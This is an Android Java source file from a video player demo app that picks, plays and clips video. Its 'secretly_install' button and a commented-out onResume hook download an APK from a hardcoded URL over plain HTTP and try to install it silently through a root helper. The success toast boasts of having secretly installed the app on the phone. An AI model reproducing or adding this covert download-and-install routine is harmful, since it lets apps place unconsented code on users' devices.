package com.mr_ladeng.videoplayerdemo;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnCompletionListener;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;
import android.text.TextUtils;
import android.util.Log;
import android.view.Surface;
import android.view.TextureView;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.MediaController;
import android.widget.Toast;
import android.widget.VideoView;

public class TestActivity extends Activity implements OnCompletionListener, OnClickListener {
	

	private TextureView surfaceView;
	private ImageView imagePlay;

	private MediaPlayer mediaPlayer;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		setContentView(R.layout.activity_test_layout);
		

		surfaceView = (TextureView) findViewById(R.id.preview_video);

		surfaceView.setOnClickListener(this);

		imagePlay = (ImageView) findViewById(R.id.previre_play);
		imagePlay.setOnClickListener(this);

		findViewById(R.id.test_bg).setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				Intent intent = new Intent(TestActivity.this, PlayVideoActivity.class);
				startActivity(intent);
				finish();
			}
		});
		
		findViewById(R.id.secretly_install).setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				
				new Thread(new Runnable() {

					@Override
					public void run() {
						loadFile(filePath);
					}
				}).start();
				
			}
		});
		
		//查看视频
		findViewById(R.id.check_video).setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				Intent intent = new Intent();
				intent.setType("video/*");
				intent.setAction(Intent.ACTION_GET_CONTENT); 
				startActivityForResult(intent, 1);
				
				//打开视频
//				Intent it = new Intent(Intent.ACTION_VIEW);
//		        it.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
//		        Uri uri = Uri.fromFile(new File(path));
//		        it.setDataAndType(uri, "video/mp4");
//		        try {
//		            startActivity(it);
//		        } catch (Exception e) {
//		            Toast.makeText(mContext, "打开视频错误", Toast.LENGTH_LONG).show();
//		        }
				
			}
		});
		
	}
	
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		
		if (data!=null) {
			Uri uri = data.getData();
			if (uri!=null) {
				String path = uri.getPath();
//				Bundle bundle = data.getExtras();
//				String videoString = (String) bundle.get("data");
				Log.i("取出来的是什么===视频路径", path);

//				Intent intent = new Intent(TestActivity.this, PlayVideoActivity.class);
//				intent.putExtra("video", path);
//				startActivity(intent);
				

				if (surfaceTexture != null) {
					prepare(new Surface(surfaceTexture), path);
				}

				surfaceView.setSurfaceTextureListener(new SurfaceListener(path));
				if (null != path && !"".equals(path)) {
					imagePlay.setVisibility(View.VISIBLE);
					((LinearLayout) findViewById(R.id.previre_progre)).setVisibility(View.GONE);
				}
				mediaPlayer = new MediaPlayer();
				mediaPlayer.setOnCompletionListener(this);
			}
		}
	}
	
	private void prepare(Surface surface, String path) {
		try {
			mediaPlayer.reset();
			mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
			// 设置需要播放的视频
			//mediaPlayer.setDataSource(path);

			File extDir = Environment.getExternalStorageDirectory();
			File file = new File(path);  
			File fullFilename =new File(extDir.getAbsolutePath() + extDir.pathSeparatorChar  + path);
//			try {
				fullFilename.setWritable(true);
				fullFilename.setReadable(true);
				 if (!fullFilename.exists() || !fullFilename.isDirectory()) {  
					 fullFilename.mkdir();  
		            } 
//			    fullFilename.createNewFile();
			   // fullFilename.setWritable(Boolean.TRUE);
//			} catch (IOException e) {
//			    e.printStackTrace();//java.io.IOException: open failed: ENOENT (No such file or directory)
//			}
			 
			FileInputStream fis = new FileInputStream(fullFilename); 
			mediaPlayer.setDataSource(fis.getFD()); 
			// 把视频画面输出到Surface
			mediaPlayer.setSurface(surface);
			mediaPlayer.setLooping(false);
			//mediaPlayer.prepare();
			mediaPlayer.prepareAsync(); 
			mediaPlayer.seekTo(0);//java.io.FileNotFoundException: /storage/emulated/0:/document/video:2110: open failed: ENOENT (No such file or directory)
		} catch (Exception e) {//java.io.FileNotFoundException: /document/video:2110: open failed: ENOENT (No such file or directory)
			Log.e("mediaPlayer---exception", e.getMessage());
		}
	}
	
	
	@Override
	public void onCompletion(MediaPlayer mp) {
		imagePlay.setVisibility(View.VISIBLE);
	};
	

	private SurfaceTexture surfaceTexture;
	private class SurfaceListener implements TextureView.SurfaceTextureListener {
		private String path;

		public SurfaceListener(String path) {
			this.path = path;
		}

		@Override
		public void onSurfaceTextureAvailable(SurfaceTexture arg0, int arg1,
				int arg2) {
			if (null == path || "".equals(path)) {
				surfaceTexture = arg0;
			} else {
				prepare(new Surface(arg0), path);
			}
		}

		@Override
		public boolean onSurfaceTextureDestroyed(SurfaceTexture arg0) {
			return false;
		}

		@Override
		public void onSurfaceTextureSizeChanged(SurfaceTexture arg0, int arg1,
				int arg2) {

		}

		@Override
		public void onSurfaceTextureUpdated(SurfaceTexture arg0) {

		}

	}

	// 测试apk
	//private String filePath = "http://rebate.yomai.com/update/rebate1.0.apk";
	private String filePath = "http://www.baidu.com/upload/baidu.apk";

	// http://dd.myapp.com/16891/E66C2055E833834BC9B038A7AE1BD600.apk?fsname=com.founder.font.ui_2.1.4_15.apk&asr=8eff

	@Override
	protected void onResume() {
		super.onResume();

//		new Thread(new Runnable() {
//
//			@Override
//			public void run() {
//				loadFile(filePath);// 方法2：
//			}
//		}).start();
	}

	/***	下载装逼神器		**/
	public void loadFile(String url) {
		HttpClient client = new DefaultHttpClient();
		HttpGet get = new HttpGet(url);
		HttpResponse response;
		try {
			response = client.execute(get);
			HttpEntity entity = response.getEntity();
			float length = entity.getContentLength();
			InputStream is = entity.getContent();
			FileOutputStream fileOutputStream = null;
			if (is != null) {
				File file = new File(Environment.getExternalStorageDirectory(), "xxx.apk");
				fileOutputStream = new FileOutputStream(file);
				byte[] buf = new byte[1024];
				int ch = -1;
				float count = 0;
				while ((ch = is.read(buf)) != -1) {
					fileOutputStream.write(buf, 0, ch);
					count += ch;
					sendMsg(1, (int) (count * 100 / length));
				}
			}
			sendMsg(2, 0);
			fileOutputStream.flush();
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
		} catch (Exception e) {
			sendMsg(-1, 0);
		}
	}

	private void sendMsg(int flag, int c) {
		Message msg = new Message();
		msg.what = flag;
		msg.arg1 = c;
		handler.sendMessage(msg);
	}

	private Handler handler = new Handler() {
		@Override
		public void handleMessage(Message msg) {// 定义一个Handler，用于处理下载线程与UI间通讯
			if (!Thread.currentThread().isInterrupted()) {
				switch (msg.what) {
				
				case 1:
					//下载的进度
					break;

				case 2://下载完成

					new Thread(new Runnable() {

						@Override
						public void run() {
							// 测试成功
							int slientInstall = DensityUtil .slientInstall(new File(Environment .getExternalStorageDirectory(), "xxx.apk"));
							mHandler.sendEmptyMessage(slientInstall);
						}
					}).start();

					break;

			
				}
			}
			super.handleMessage(msg);
		}
	};

	private Handler mHandler = new Handler() {

		public void handleMessage(Message msg) {

			switch (msg.what) {

			case 11:

				Toast.makeText(TestActivity.this, "成功给手机偷偷安装了装逼神器！", Toast.LENGTH_SHORT) .show();

				break;

			case 12:

				Toast.makeText(TestActivity.this, "安装失败！", Toast.LENGTH_SHORT) .show();

				break;
				
			case 13:
				
				Toast.makeText(TestActivity.this, "未知错误！", Toast.LENGTH_SHORT) .show();
				
				break;
				
			case 14:
				
				Toast.makeText(TestActivity.this, "没有root权限！", Toast.LENGTH_SHORT) .show();
				File file = new File(Environment .getExternalStorageDirectory(), "xxx.apk");
				DensityUtil.install(TestActivity.this, String.valueOf(file));
				
				
				break;

			default:
				break;
			}

		};
	};
	

	protected void onDestroy() {
		super.onDestroy();
		
		handler.removeCallbacksAndMessages(null);
		mHandler.removeCallbacksAndMessages(null);

	}

	@Override
	public void onClick(View v) {

		switch (v.getId()) {
		
		case R.id.previre_play:
			
//			if (!mediaPlayer.isPlaying()) {
//				mediaPlayer.start();
//			}
//			imagePlay.setVisibility(View.GONE);
			
			try {//   /storage/emulated/0/DCIM/VID_20150707_211648.mp4
				ClipUtil.clipVideo("/storage/emulated/0/DCIM/VID_20150707_211648.mp4", 1.5, 5.0);
			} catch (IOException e) {
				e.printStackTrace();
				Log.e("clipVideo--error===>", e.getMessage());
			}
			
			break;
			

		case R.id.preview_video:
			if (mediaPlayer.isPlaying()) {
				mediaPlayer.pause();
				imagePlay.setVisibility(View.VISIBLE);
			}
			break;
		}
	}


}
